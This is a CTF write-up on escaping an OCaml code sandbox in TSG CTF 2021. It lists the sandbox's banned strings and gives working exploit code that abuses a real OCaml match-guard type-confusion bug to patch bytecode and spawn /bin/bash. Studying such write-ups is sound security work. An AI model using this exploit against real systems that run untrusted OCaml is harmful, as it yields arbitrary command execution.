---
layout: post
title: "[TSG 2021] Catastrophe - OCaml Exploitation"
author: Robert Xiao
---

Maple Bacon participated in [TSG CTF 2021](https://ctftime.org/event/1431),
which was organized by the [Theoretical Science Group of the University of
Tokyo](https://tsg.ne.jp/). We placed 13th overall. During the competition, I
worked on a problem called Catastrophe, which was about exploiting a
deliberately introduced bug in the OCaml compiler. We ended up being the only
solvers for this challenge!

I chose this problem because I've never done anything with OCaml, so it seemed
like a good opportunity to learn a little about the language. OCaml is a
strongly typed programming language with strong type-safety guarantees: programs
which compile correctly (and which avoid explicitly-unsafe operations) will
generally be free of undefined behaviour.

In this challenge, we're allowed to upload OCaml code to a remote server, which
will compile and then execute our code with a few restrictions applied. There
have been at least two prior CTF challenges with a similar setup: [mlml at
SECCON 2020](https://moraprogramming.hateblo.jp/entry/2020/10/14/185946) and
[Secure OCaml Sandbox at PlaidCTF 2021](https://ctftime.org/task/15638).

The restrictions applied are intended to serve as a sort of sandbox, to prevent
us from doing things which break type safety as well as preventing access to
functionality like file reading and command execution. The specific set of restrictions
is as follows:

- Only the `Printf` and `Bytes` modules are available
- The `Bytes` module is patched so that all of its `unsafe` functions are unavailable
- The following strings are forbidden from appearing anywhere in the uploaded code:
    - `__`: Blocks access to certain built-in internal variables
    - `open`, `include`: Prevents loading new modules
    - `unsafe`: Blocks unsafe functionality
    - `.`: Prevents accessing any sub-object; in particular, blocks the `Callback.register` function used in some of the solutions to the PlaidCTF 2021 problem
    - `external`: Prevents accessing native functions
    - `(*`: Blocks comments
    - `match`: Blocks `match` expressions; this blocks the `match`-based type safety hole which was the intended bug in the SECCON 2020 problem
    - `read`, `#`, `[`, `{%`, `{<`: I'm not completely sure why these are banned

## The intentional bug

In this challenge, the compiler is patched in a particular way to open a huge type-safety hole:

```diff
diff -ruN ocaml-4.12.0/typing/typecore.ml ocaml/typing/typecore.ml
--- ocaml-4.12.0/typing/typecore.ml	2021-02-24 11:15:39.000000000 +0000
+++ ocaml/typing/typecore.ml	2021-09-10 10:12:07.996226021 +0000
@@ -2163,7 +2163,7 @@
   | Texp_letexception _
   | Texp_letop _
   | Texp_extension_constructor _ ->
-    false
+    try let _ = Sys.getenv "PWN" in true with Not_found -> false

 and is_nonexpansive_mod mexp =
   match mexp.mod_desc with
```

On the remote server, the `PWN` environment variable is indeed set, which causes
this patched line of code to return `true` instead of `false`. This patch causes
the function `is_nonexpansive` to return `true` under almost any circumstance.
To understand how this breaks type safety, the best guide I found was [Weak Type
Variables on
OCamlverse](https://ocamlverse.github.io/content/weak_type_variables.html). In
short, certain operations are impure from a functional programming perspective
(they have side effects) which means that the type checker needs more
information in order to fully determine the types involved. The function
`is_nonexpansive` is responsible for determining which operations may have such
side effects.

One such operation is partial function application (`Texp_apply`). The guide
gives the following example of a case where partial function application can
produce side effects:

```ocaml
let const _ =
  let cache = ref None in
  fun x -> match !cache with
    | Some cached when cached = x -> cached
    | _ -> cache := Some x; x
```

Calling `let id = const ()` will create a closure with an internal mutable
reference, which can be returned by future calls to the same function.

A naïve type-check of `id` would give it the type `'a -> 'a`, that
is, a function which returns the same type as what you passed in; however,
due to the internal reference, a different type might actually be returned,
which would break type safety. The guide gives the following example:

```ocaml
let x = ref 0 and y = ref 3.14 in
  id x;
  id y := 0.0
```

Indeed, if we try this slightly modified example with the broken compiler:

```ocaml
let const _ =
  let cache = ref None in
  fun x -> match !cache with
    | Some cached -> cached
    | _ -> cache := Some x; x

let id = const ()
;;

let x = ref 0 and y = ref "x" in
  id x;
  id y := "cool";
  Printf.printf "%x\n" !x;
```

we get output like `3fdefafbefc8`, which looks kind of like a memory address!
In fact, it's exactly 1/2 of a memory address, because OCaml treats the low
bit of integers as a flag bit.

Unfortunately, the `match` expression is banned, so we have to find some other
way to implement this buggy function. We can use the implicit pattern matching
syntax instead, which looks like this:

```ocaml
function foo
  | Some x -> 0
  | _ -> 1
```

...wait a sec, this is a `match` expression without the `match` keyword! It
passes the string filter, and so we can use the SECCON 2020 solution with the
`match` type unsafety, without using the bug that TSG provided!

## The unintentional bug

I'm not very good with OCaml code, so after a few attempts of trying and failing
to adjust the `cache` function to do what I wanted (without using `match`), I
decided to instead just rewrite the SECCON 2020 exploit to avoid the `match`
keyword.

A quick background on this bug: it turns out that the OCaml compiler contains a
[real type unsafety bug](https://github.com/ocaml/ocaml/issues/7241) relating to
mutations within `match` expressions, which has not been fixed in over five
years. From the SECCON 2020 writeup, the following code will segfault:

```ocaml
type u = {a: bool; mutable b: int option}

let f x =
  match x with
    {a=false} -> 0
  | {b=None} -> 1
  | _ when (x.b <- None; false) -> 2
  | {a=true; b=Some y} -> y

let _ = f {a=true; b=Some 5}
```

Match arms are tested in sequence; for this particular input, only the last
match arm should match. However, the third match arm overwrites `x.b` with
a `None`, which causes the final match arm to dereference `None` and crash.
This can be used as the basis for a type confusion exploit. The SECCON post
comes with an exploit, but it uses a ton of hardcoded constants which I could
not successfully adjust. Instead, I focused on the core of the type confusion
exploit, which looks like this (slightly rewritten):

```ocaml
type s = A of int | B of string
let leak (x1,x2) s =
  match (x1,x2) with
    (false,_) -> 0
  | (_,{contents=B _}) -> 1
  | _ when (x2 := B(s); false) -> 2
  | (true, {contents=A y}) -> y

let x = leak (true, ref (A 1)) "asdf" * 2
let _ = Printf.printf "0x%x\n" x
```

This prints out a memory address corresponding to the address of the string `"asdf"`. We can rewrite this without
the `match` keyword:

```ocaml
type s = A of int | B of string
let leak s = function
    (false,_) -> 0
  | (_,{contents=B _}) -> 1
  | (x1,x2) when (x2 := B(s); false) -> 2
  | (true, {contents=A y}) -> y

let x = leak "asdf" (true, ref (A 1))  * 2
let _ = printf "0x%x\n" x
```

which passes all restrictions and still prints out a memory address! So, at this
point, we can abuse the type system, and we didn't even have to use the provided
bug.

## The exploit

I initially tried to adjust the SECCON exploit, and got as far as overwriting
`__free_hook` successfully on the TSG libc, but since `free` doesn't get called
frequently in OCaml, this was unfruitful. Instead, I decided to go for a simpler
approach: overwrite the OCaml bytecode directly to execute arbitrary code.

OCaml bytecode is quite unusual: it's a sequence of 32-bit words which are
actually code offsets inside the interpreter's main loop, which is written in C.
The interpreter does the following to dispatch an instruction:

```c
goto *(void *)(jumptbl_base + *pc++)
```

We could corrupt the `pc` to jump to the middle of an instruction handler and do
ROP-like things, but the easier thing would be simply to overwrite the argument
to an instruction like `C_CALL1`:

```c
    Instruct(C_CALL1):
      Setup_for_c_call;
      accu = Primitive(*pc)(accu);
      Restore_after_c_call;
      pc++;
      Next;
```

This uses `*pc` as an index into a table called `caml_prim_table` containing
every primitive (C) function. Luckily, one of those functions is
`caml_sys_system_command`, corresponding to the OCaml function `Sys.command` and
functioning very similarly to `system` in C.

The exploit I devised does the following:

- Define a function which calls `int_of_string`, a benign primitive function with
the same signature as `Sys.command`.
- Alias a reference to that function as an integer to leak its address
- Alias an integer as a `bytes` object to provide access to the bytecode
    - There's a slight subtlety here: the `bytes` object requires a valid header
      with an object size that is valid, since OCaml will attempt to dereference
      the last byte of the object in `caml_string_length`. The pointer also needs
      to be odd because of how integers are stored.
- Patch the `C_CALL` instruction's argument to point at `caml_sys_system_command`
- Execute the modified function to gain a shell

The code is relatively short and sweet:

```ocaml
type a = A1 of int ref | A2 of (string -> int)
type b = B1 of int | B2 of bytes

let leak_fn fn_s2i = function
    (false, _) -> ref 0
  | (_, {contents=A2 _}) -> ref 1
  | (x1, x2) when (x2 := A2 fn_s2i; false) -> ref 2
  | (true, {contents=A1 addr}) -> addr

let mkbytes addr = function
    (false, _) -> of_string "a"
  | (_,{contents=B1 _}) -> of_string "b"
  | (x1, x2) when (x2 := B1 addr; false) -> of_string "c"
  | (true, {contents=B2 y}) -> y

let magic x = int_of_string x

let magic_addr = !(leak_fn magic (true, ref (A1 (ref 1)))) * 2
let magic_bytes = mkbytes ((magic_addr + 3) / 2) (true, ref (B2 (of_string "x")))
let _ = set magic_bytes 5 (char_of_int 0x82)
let _ = set magic_bytes 6 (char_of_int 0x01)
let _ = magic "/bin/bash"
```

When run, this hands us a shell, from which we can use `ls` and `cat` to get the flag:

`TSGCTF{superCamlFlagilisticExplicitUnsound}`

Best of all, it works even with `PWN` unset, i.e. without the deliberate bug that was
introduced for this problem!
